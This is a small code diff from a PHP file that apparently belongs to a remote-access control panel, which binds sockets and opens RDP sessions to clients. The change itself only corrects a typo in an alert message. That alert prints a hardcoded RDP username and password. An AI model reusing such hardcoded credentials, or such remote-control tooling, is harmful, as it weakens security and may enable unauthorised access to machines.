@@ -33,7 +33,7 @@ function createSocket($ip, $usr,$con) {
 	}
 	
 	if($binded===0){socket_close($socket);return false;}
-	if($usr===1){$currentadminport=$binded;echo "<script>alert('Client RDP session initiliazed .\\n Connect to rdp using $ipsrv:$binded   \\nusername:netmaster password:rdp.f3di006')</script>";flush();}
+	if($usr===1){$currentadminport=$binded;echo "<script>alert('Client RDP session initialized.\\n Connect to rdp using $ipsrv:$binded   \\nusername:netmaster password:rdp.f3di006')</script>";flush();}
 	else{ 
 	$id=mysqli_real_escape_string($con,$_GET["id"]);
 	$command="8|$binded";
